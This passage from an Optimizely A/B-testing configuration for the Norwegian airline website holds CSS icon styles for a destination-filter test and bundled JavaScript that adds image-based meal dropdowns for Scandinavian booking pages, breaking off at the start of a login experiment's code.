xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-396 571.5 48 48' id='medium--type-sun-and-sea--light' y='6983'%3E%3Cg fill='%23FFF'%3E%3Cpath d='M-361 571.5v4c0 .6.4 1 1 1s1-.4 1-1v-4h-2zM-359 595.5v-4c0-.6-.4-1-1-1s-1 .4-1 1v4h2z'/%3E%3C/g%3E%3Cg fill='%23FFF'%3E%3Cpath d='M-369.2 575.8l2.8 2.8c.4.4 1 .4 1.4 0s.4-1 0-1.4l-2.8-2.8-1.4 1.4zM-350.8 591.3l-2.8-2.8c-.4-.4-1-.4-1.4 0s-.4 1 0 1.4l2.8 2.8 1.4-1.4z'/%3E%3C/g%3E%3Cg fill='%23FFF'%3E%3Cpath d='M-372 584.5h4c.6 0 1-.4 1-1s-.4-1-1-1h-4v2zM-348 582.5h-4c-.6 0-1 .4-1 1s.4 1 1 1h4v-2z'/%3E%3C/g%3E%3Cg fill='%23FFF'%3E%3Cpath d='M-367.8 592.8l2.8-2.8c.4-.4.4-1 0-1.4s-1-.4-1.4 0l-2.8 2.8 1.4 1.4zM-352.2 574.5l-2.8 2.8c-.4.4-.4 1 0 1.4s1 .4 1.4 0l2.8-2.8-1.4-1.4z'/%3E%3C/g%3E%3Ccircle fill='%23FFF' cx='-360' cy='583.5' r='5'/%3E%3Cpath fill='none' stroke='%23FFF' stroke-width='2' stroke-miterlimit='10' d='M-396 611.5c4 0 4 2 8 2s4-2 8-2 4 2 8 2 4-2 8-2 4 2 8 2 4-2 8-2M-396 616.5c4 0 4 2 8 2s4-2 8-2 4 2 8 2 4-2 8-2 4 2 8 2 4-2 8-2'/%3E%3Cpath fill='%23FFF' d='M-375.6 587.6c-4.2.7-8.2 2.7-11.4 5.9-3.2 3.2-5.2 7.2-5.9 11.4l1.7 1.7 17.3-17.3-1.7-1.7zM-373.5 605.8c.4.4.4 1 0 1.4-.4.4-1 .4-1.4 0l-7.1-7.1c-.4-.4-.4-1 0-1.4.4-.4 1-.4 1.4 0l7.1 7.1z'/%3E%3Cpath fill='%23FFF' d='M-385.9 593.3c.4.4.4 1 0 1.4-.4.4-1 .4-1.4 0l-1.4-1.4c-.4-.4-.4-1 0-1.4.4-.4 1-.4 1.4 0l1.4 1.4z'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Spanien\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Spania\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' version='1.1' id='medium--type-spain--light' y='6887' width='48' height='48' xml:space='preserve' viewBox='0 0 48 48'%3E%3Cstyle%3E.fpst0%7Bfill:%23fff%7D%3C/style%3E%3Cpath class='fpst0' d='M20 30c-4.9-1.2-9-1.2-9-1.2-3.7-.1-7.3.4-11 2v7.9c3.7-1.6 7.3-2.1 11-2 5.9.3 9 1.2 9 1.2 9.3 1.9 18.7 4.9 28 .8v-7.9c-9.3 4.1-18.7 1-28-.8zM20 8.2C15.1 7 11 7 11 7c-3.7-.1-7.3.4-11 2v7.9c3.7-1.6 7.3-2.1 11-2 5.9.3 9 1.2 9 1.2 9.3 1.9 18.7 4.9 28 .8V9c-9.3 4.1-18.7 1-28-.8z'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Storstad\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Storby\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-396 571.5 48 48' id='medium--type-city-vibes--light' y='6311'%3E%3Cpath fill='%23FFF' d='M-350 608.6v-2l-8-2v4h-3v-20h-2v-10h-1v10h-8v-10h-1v10h-2v12h-2.3l-1.7-29h-8l-1.7 29h-4.3v3h-3v16h48v-11h-2zm-40 7h-2v-3h2v3zm0-5h-2v-3h2v3zm4-36h6v1h-6v-1zm0 4h6v1h-6v-1zm0 4h6v1h-6v-1zm0 4h6v1h-6v-1zm0 4h6v1h-6v-1zm-1 4h8v1h-8v-1zm0 4h8v1h-8v-1zm0 4h8v1h-8v-1zm1 13h-2v-3h2v3zm0-5h-2v-3h2v3zm4 5h-2v-3h2v3zm0-5h-2v-3h2v3zm4 5h-2v-3h2v3zm0-5h-2v-3h2v3zm6 1h-1v-22h1v22zm3 0h-1v-22h1v22zm3 0h-1v-22h1v22zm3 0h-1v-22h1v22z'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Sverige\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-273 396.9 48 48' id='medium--from-a-to-b--light' y='3480'%3E%3Cpath fill='%23FFF' d='M-225.3 417.5c0-1.6-6.3-4.3-11.1-4.4h-2.6v6.8h5.6c3.9 0 8.1-1.5 8.1-2.4zM-241.2 413.1h-17.6c-2.2-2.6-5.8-7.1-6.4-7.8-.8-1-1.8-1.4-1.8-1.4h-3l2 9.2h-5v1.2l15.3 5.6h3.6c-.5.4-.8 1-.8 1.5 0 1.6 3.1 2.8 6.9 2.8s4.4-1.3 4.4-2.8v-1.5h2.3v-6.8h.1z'/%3E%3Ccircle fill='%23FFF' cx='-269' cy='431.9' r='4'/%3E%3Ccircle fill='%23FFF' cx='-229' cy='431.9' r='4'/%3E%3Ccircle fill='%23FFF' cx='-260' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-253' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-245' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-238' cy='431.9' r='2'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .t136_customCheckbox_group{display:flex}body.norT136_filtersOnSide .t136_customCheckbox_group .t136_customCheckbox{position:relative;cursor:pointer;margin-bottom:0}body.norT136_filtersOnSide .t136_customCheckbox_group input{padding:0;height:auto;height:initial;width:auto;width:initial;margin-bottom:0;display:none;cursor:pointer}body.norT136_filtersOnSide .t136_customCheckbox_group .t136_customCheckbox:before{content:'';-webkit-appearance:none;background-color:transparent;border:2px solid #c3c3c3;padding:8px;display:inline-block;position:relative;vertical-align:middle;cursor:pointer;margin-right:5px;top:-2px}body.norT136_filtersOnSide .t136_customCheckbox_group input:checked+.t136_customCheckbox:after{content:'';display:block;position:absolute;top:3px;left:7px;width:6px;height:14px;border:solid #C3C3C3;border-width:0 2px 2px 0;transform:rotate(45deg)}body.norT136_filtersOnSide .nas-filter .nas-filter__filters .nas-filter__origin-combined.showItem{display:block !important;border:3px solid #c3c3c3 !important;margin-top:15px}body.norT136_filtersOnSide .nas-destination-filter__search-filter .nas-filter .nas-filter__filters .nas-filter__origin-combined.showItem .nas-dropdown{height:auto}body.norT136_filtersOnSide .nas-filter .nas-filter__filters .nas-filter__origin-combined.showItem .nas-dropdown__toggle--blured{padding:10px !important;height:auto !important}body.norT136_filtersOnSide .nas-filter .nas-filter__filters .nas-filter__origin-combined.showItem .nas-dropdown__toggle--blured .nas-dropdown__dropdown-icon{float:right !important}body.norT136_filtersOnSide .nas-destination-filter__search-filter .nas-filter .nas-filter__filters .nas-filter__origin-combined.showItem .nas-dropdown .nas-dropdown__toggle{padding:10px !important;height:auto !important}body.norT136_filtersOnSide .nas-destination-filter__search-filter .nas-filter .nas-filter__filters .nas-filter__origin-combined.showItem .nas-dropdown .nas-dropdown__toggle .nas-dropdown__dropdown-icon--rotate{float:right !important}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25247931100",
                  "endOfRange": 10000
                }],
                "name": "[Code Review] T136 / Destinations / Filters on side / Desktop / SE NO DK",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["25239971235"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": null,
              "id": "25187060345",
              "name": "[QA] T135 / Meals / Images in dropdown / Desktop",
              "commitId": "25292840207",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17279193910"],
                "audienceName": "Test Cookie",
                "changes": null,
                "id": "25151340635",
                "integrationSettings": null,
                "variations": [{
                  "id": "25158620257",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "25132580596",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "25138640578",
                    "changes": [{
                      "id": "2EEB2173-0CA8-467E-B315-B257D163D7B4",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 0);
                        }([function (module, exports, __webpack_require__) {
                          __webpack_require__(2), module.exports = __webpack_require__(3);
                        }, function (module, exports) {
                          function push_API_only(nameOfEvent) {
                            window.optimizely = window.optimizely || [], window.optimizely.push({
                              type: "event",
                              eventName: nameOfEvent
                            });
                          }
                          module.exports = {
                            push_API_only: push_API_only,
                            optimizely_trackers_clicks: function (sel, apiName) {
                              var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                              jQuery(document).on(eventNameDevice, sel, function () {
                                push_API_only(apiName);
                              });
                            }
                          };
                        }, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function listHtml(ele, topHeading, food, price, foodImage) {
                            ele.closest(".forminput").querySelector(".norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap").insertAdjacentHTML("beforeend", '<div class="norT135SelectOption">\n                    <div class="norT135SelectOptionContent '.concat(food.replaceAll(" ", "_"), '">\n                        <h4>').concat(topHeading, "</h4>\n                        <h2>").concat(food, "</h2>\n                        <p>").concat(price, '</p>\n                    </div>\n                    <div class="norT135SelectOptionImage">\n                        <img src="').concat(foodImage, '">\n                    </div>\n                    </div>'));
                          }
                          function selectBoxHtml() {
                            document.querySelectorAll("table.mealdetailstable select").forEach(function (ele) {
                              0 === ele.closest(".forminput").querySelectorAll(".norT135SelectionMenuWrapper").length && (ele.insertAdjacentHTML("beforebegin", '<div class="norT135SelectionMenuWrapper">\n            <div class="norT135SelectedValue">\n                 <p>Valg meny</p>\n                 <div class="dropDownIcon">\n                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">\n                    <path d="M3.47827 8.02374L5.61877 5.88324L9.89733 10.1618L14.1759 5.88321L16.3155 8.02283L9.89824 14.442L9.89645 14.4419L3.47827 8.02374Z" fill="#003251"/>\n                    </svg>\n                 </div>\n            </div>\n            <div class="norT135SelectOptionWrap">\n            </div>\n        </div>'), ele.querySelectorAll("option").forEach(function (optionEle) {
                                if (-1 === optionEle.textContent.indexOf("Velg meny")) {
                                  var price = "";
                                  optionEle.textContent.indexOf("(") > -1 && optionEle.textContent.indexOf(")") > -1 && (price = optionEle.textContent.split("(")[1].split(")")[0].trim());
                                  var topHeading = optionEle.textContent.split("(")[0].trim(),
                                    filteredItems = {
                                      se: [{
                                        title: "Standardmåltid",
                                        food: "Omelett med spenat",
                                        time: "before",
                                        foodImage: "https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotbrunchnew.jpg"
                                      }, {
                                        title: "Barnmåltid",
                                        food: "Chokladpannkakor",
                                        time: "before",
                                        foodImage: "https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/childsmealbrunch.jpg"
                                      }, {
                                        title: "Standardmåltid",
                                        food: "Ugnsstekt kycklingbröst med en örtig tomatsås",
                                        time: "after",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotlunchdinnerscandi.jpg"
                                      }, {
                                        title: "Barnmåltid",
                                        food: "Köttbullar med potatismos",
                                        time: "after",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/childsmeal.jpg"
                                      }, {
                                        title: "Vegetarisk måltid",
                                        food: "Masala med Quinoa",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg"
                                      }, {
                                        title: "Vegansk måltid",
                                        food: "Masala med Quinoa",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg"
                                      }, {
                                        title: "Glutenfri måltid",
                                        food: "Stekt kycklingsbröst med en krämig risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }, {
                                        title: "Laktosfri måltid",
                                        food: "Stekt kycklingsbröst med en krämig risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }, {
                                        title: "Måltid för diabetiker",
                                        food: "Stekt kycklingsbröst med en krämig risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }],
                                      dk: [{
                                        title: "Klassisk ret",
                                        food: "Omelet med spinat",
                                        time: "before",
                                        foodImage: "https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotbrunchnew.jpg"
                                      }, {
                                        title: "Børneret",
                                        food: "Chokolade pandekager",
                                        time: "before",
                                        foodImage: "https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/childsmealbrunch.jpg"
                                      }, {
                                        title: "Klassisk ret",
                                        food: "Stegt kyllingebryst med en sauce af tomat og urter",
                                        time: "after",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotlunchdinnerscandi.jpg"
                                      }, {
                                        title: "Børneret",
                                        food: "Kødboller med kartoffelmos",
                                        time: "after",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/childsmeal.jpg"
                                      }, {
                                        title: "Vegetarret",
                                        food: "Masala med Quinoa",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg"
                                      }, {
                                        title: "Veganerret",
                                        food: "Masala med Quinoa",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg"
                                      }, {
                                        title: "Glutenfri ret",
                                        food: "Stegt kyllingebryst med cremet risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }, {
                                        title: "Laktosefri ret",
                                        food: "Stegt kyllingebryst med cremet risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }, {
                                        title: "Diabetesvenlig ret",
                                        food: "Stegt kyllingebryst med cremet risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }],
                                      no: [{
                                        title: "Standard-rett",
                                        food: "Omelett med spinat",
                                        time: "before",
                                        foodImage: "https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotbrunchnew.jpg"
                                      }, {
                                        title: "Barne-rett",
                                        food: "Sjokoladepannekaker",
                                        time: "before",
                                        foodImage: "https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/childsmealbrunch.jpg"
                                      }, {
                                        title: "Standard-rett",
                                        food: "Stekt kyllingbryst med tomatsaus",
                                        time: "after",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotlunchdinnerscandi.jpg"
                                      }, {
                                        title: "Barne-rett",
                                        food: "Kjøttboller med potetmos",
                                        time: "after",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/childsmeal.jpg"
                                      }, {
                                        title: "Vegetar-rett",
                                        food: "Masala med Quinoa",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg"
                                      }, {
                                        title: "Vegan-rett",
                                        food: "Masala med Quinoa",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg"
                                      }, {
                                        title: "Glutenfri rett",
                                        food: "Stekt kyllingbryst med en kremet risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }, {
                                        title: "Laktosefri rett",
                                        food: "Stekt kyllingbryst med en kremet risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }, {
                                        title: "Diabetesvennlig rett",
                                        food: "Stekt kyllingbryst med en kremet risotto",
                                        foodImage: "https://www.norwegian.no/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/dietarydish.jpg"
                                      }]
                                    }[host = window.location.hostname.replace("www.norwegian.", ""), "no" !== host && (host = window.location.pathname.split("/")[1]), host].filter(function (ele) {
                                      return ele.title === topHeading;
                                    });
                                  if (filteredItems.length > 0) if ("Standard-rett" === topHeading || "Barne-rett" === topHeading || "Standardmåltid" === topHeading || "Barnmåltid" === topHeading || "Børneret" === topHeading || "Klassisk ret" === topHeading) !function (filteredItems, ele, topHeading, price) {
                                    document.querySelectorAll('.mealdetailstable tr .header[nowrap="nowrap"]').forEach(function (leftEle) {
                                      var leftSideDesName = leftEle.closest("tr").querySelector(".header").textContent.trim();
                                      document.querySelectorAll(".selectiontable td.leftcell.emphasize").forEach(function (rightEle) {
                                        var rightSideDesName = rightEle.textContent.trim();
                                        if (leftSideDesName === rightSideDesName) for (var time = rightEle.closest("tr").nextElementSibling.innerHTML.match(/\b\d{1,2}:\d{2}\b/g)[0], currentLeftEle = leftEle.closest("tr").nextElementSibling; currentLeftEle;) {
                                          if (currentLeftEle.querySelectorAll("select").length > 0) (time = time.split(":")[0]) < "09" && time >= "00" ? ((filteredItems = filteredItems.filter(function (ele) {
                                            return "before" === ele.time;
                                          })).forEach(function (item) {
                                            0 === ele.closest(".forminput").querySelector(".norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap").querySelectorAll(".".concat(item.food.replaceAll(" ", "_"))).length && listHtml(ele, topHeading, item.food, price, item.foodImage);
                                          }), currentLeftEle.querySelector("select").classList.add("beforeNine")) : (currentLeftEle.querySelector("select").classList.add("AfterNine"), (filteredItems = filteredItems.filter(function (ele) {
                                            return "after" === ele.time;
                                          })).forEach(function (item) {
                                            0 === ele.closest(".forminput").querySelector(".norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap").querySelectorAll(".".concat(item.food.replaceAll(" ", "_"))).length && listHtml(ele, topHeading, item.food, price, item.foodImage);
                                          }));else if (currentLeftEle.querySelectorAll('.header[nowrap="nowrap"]').length > 0) break;
                                          currentLeftEle = currentLeftEle.nextElementSibling;
                                        }
                                      });
                                    });
                                  }(filteredItems, ele, topHeading, price);else {
                                    var data = filteredItems[0],
                                      food = data.food,
                                      foodImage = data.foodImage;
                                    listHtml(ele, topHeading, food, price, foodImage);
                                  }
                                }
                                var host;
                              })), "" !== ele.value && ele.querySelectorAll("option").forEach(function (optionEle) {
                                var optionValue = optionEle.value,
                                  currentElement = ele;
                                if (ele.value === optionValue) {
                                  var currentEelementT135 = currentElement.closest(".forminput");
                                  currentEelementT135.querySelector(".norT135SelectionMenuWrapper .norT135SelectedValue p").textContent = optionEle.textContent, currentEelementT135.querySelector(".norT135SelectionMenuWrapper .norT135SelectedValue").classList.add("t135DropdownSelected"), currentEelementT135.querySelectorAll(".norT135SelectionMenuWrapper .norT135SelectOption").forEach(function (customOptions) {
                                    customOptions.querySelector("h4").textContent.trim() === optionEle.textContent.split("(")[0].trim() && customOptions.classList.add("t135OptionSelected");
                                  });
                                }
                              });
                            });
                          }
                          __webpack_require__.r(__webpack_exports__);
                          var tracker = __webpack_require__(1);
                          !function () {
                            function init_NORT135() {
                              var toggleButtonSelector, elementToToggleSelector, toggleButtons, elementsToToggle, isToggled;
                              console.log("******NORT135*****"), document.querySelector("body").classList.add("norT135"), selectBoxHtml(), toggleButtonSelector = ".norT135 .norT135SelectionMenuWrapper .norT135SelectedValue", elementToToggleSelector = ".norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap", toggleButtons = document.querySelectorAll(toggleButtonSelector), elementsToToggle = document.querySelectorAll(elementToToggleSelector), isToggled = Array.from({
                                length: toggleButtons.length
                              }, function () {
                                return !1;
                              }), toggleButtons.forEach(function (button, index) {
                                button.addEventListener("click", function () {
                                  var elementHeight = elementsToToggle[index].scrollHeight;
                                  toggleButtons.forEach(function (otherButton, otherIndex) {
                                    otherIndex !== index && isToggled[otherIndex] && (elementsToToggle[otherIndex].style.height = "0", elementsToToggle[otherIndex].style.border = "0", elementsToToggle[otherIndex].closest(".norT135SelectionMenuWrapper").classList.remove("dropDownActive"), isToggled[otherIndex] = !1);
                                  }), isToggled[index] ? (elementsToToggle[index].style.height = "0", elementsToToggle[index].style.border = "0", elementsToToggle[index].closest(".norT135SelectionMenuWrapper").classList.remove("dropDownActive")) : (elementsToToggle[index].style.height = "".concat(elementHeight, "px"), elementsToToggle[index].style.border = "1.6px solid #003251", elementsToToggle[index].closest(".norT135SelectionMenuWrapper").classList.add("dropDownActive")), isToggled[index] = !isToggled[index];
                                });
                              }), document.querySelectorAll(".norT135SelectOption").forEach(function (option) {
                                option.addEventListener("click", function (e) {
                                  var name = e.currentTarget.querySelector("h4").textContent.trim(),
                                    select = e.currentTarget.closest(".forminput").querySelector("select");
                                  Array.from(select.querySelectorAll("option")).find(function (ele) {
                                    ele.textContent.indexOf(name) > -1 && (select.value = ele.getAttribute("value"), select.dispatchEvent(new Event("change")));
                                  });
                                });
                              }), document.querySelectorAll(".norT135SelectOption").forEach(function (ele) {
                                ele.addEventListener("click", function () {
                                  tracker.push_API_only("select_meal");
                                });
                              });
                            }
                            !function () {
                              var observer,
                                listeners = [],
                                doc = window.document,
                                MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                              function check() {
                                for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                                  listener = listeners[i];
                                  for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                                }
                              }
                              window.optiReady = function (selector, fn) {
                                listeners.push({
                                  selector: selector,
                                  fn: fn
                                }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                                  childList: !0,
                                  subtree: !0
                                }), check();
                              };
                            }(), window.optiReady(".sectionboxmeal .forminput", function () {
                              (function (predicate) {
                                var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                                return new Promise(function (resolve) {
                                  var int = setInterval(function () {
                                    predicate() && (resolve(predicate()), clearInterval(int), int = null);
                                  }, 500);
                                  setTimeout(function () {
                                    null !== int && (clearInterval(int), console.log("condition false"));
                                  }, time);
                                });
                              })(function () {
                                return null !== document.querySelector("table.mealdetailstable select") && null !== document.querySelector("table.mealdetailstable select option");
                              }).then(function () {
                                init_NORT135();
                              });
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "9DF14263-314F-42A2-9D7B-26E169B163B1",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>.norT135 table.mealdetailstable select{display:none}.norT135 .norT135SelectionMenuWrapper .norT135SelectedValue{height:39.26px;border-radius:0;border:1.6px solid #6F6F6F;max-width:331.36px;display:flex;align-items:center;width:100%;padding:9.6px 12.84px;justify-content:space-between;cursor:pointer}.norT135 .norT135SelectedValue.t135DropdownSelected,.norT135 .norT135SelectOption.t135OptionSelected{background:#EBF4ff}.norT135 .norT135SelectionMenuWrapper .norT135SelectedValue p{margin:0;font-size:16px;line-height:24px;font-family:apercu,helvetica neue,Helvetica,Arial,sans-serif}.norT135 .norT135SelectionMenuWrapper .norT135SelectedValue .dropDownIcon{width:20px;height:20px}.norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap{max-width:331.36px;width:100%;border-top:unset;position:absolute;background:#fff;left:0;top:39.26px;z-index:99;height:0;overflow:hidden;transition:height 0.3s ease;border-top:0 !important;max-height:450px;overflow-y:auto}.norT135 .norT135SelectionMenuWrapper .norT135SelectOption{padding:4px 8px;display:flex;justify-content:space-between;border-bottom:1.6px solid #EAEAEA;cursor:pointer}.norT135 .norT135SelectionMenuWrapper .norT135SelectOptionImage{max-width:150px;width:100%}.norT135 .norT135SelectionMenuWrapper .norT135SelectOption h4,.norT135 .norT135SelectionMenuWrapper .norT135SelectOption p{font-size:12.84px;font-weight:700;line-height:19.23px;font-family:apercu,helvetica neue,Helvetica,Arial,sans-serif;color:#003251;margin:0}.norT135 .norT135SelectionMenuWrapper .norT135SelectOption h2{font-size:12.84px;font-weight:400;line-height:19.23px;margin:0}.norT135 .norT135SelectionMenuWrapper .norT135SelectOption:last-child{border:0}.norT135SelectionMenuWrapper{position:relative}.norT135SelectionMenuWrapper.dropDownActive svg{transform:rotate(-180deg);transition:all 0.3s ease}.norT135SelectionMenuWrapper svg{transition:all 0.3s ease}.norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap::-webkit-scrollbar{width:6px}.norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap::-webkit-scrollbar-track{background-color:#f1f1f1}.norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap::-webkit-scrollbar-thumb{background-color:rgba(0, 42, 58, 0.47059)}.norT135 .norT135SelectionMenuWrapper .norT135SelectOptionWrap ::-webkit-scrollbar-thumb:hover{background-color:#555}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25132580596",
                  "endOfRange": 10000
                }],
                "name": "[QA] T135 / Meals / Images in dropdown / Desktop",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["25138640578"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": null,
              "id": "25222630749",
              "name": "[Code review] T138 / Log in / Log in for CashPoints / Mobile",
              "commitId": "25266450349",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17279193910"],
                "audienceName": "Test Cookie",
                "changes": null,
                "id": "25228910674",
                "integrationSettings": null,
                "variations": [{
                  "id": "25220810815",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "25241510788",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "25260630359",
                    "changes": [{
                      "id": "6DF4FE37-14E6-49DC-8D79-63B8D7BA9146",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
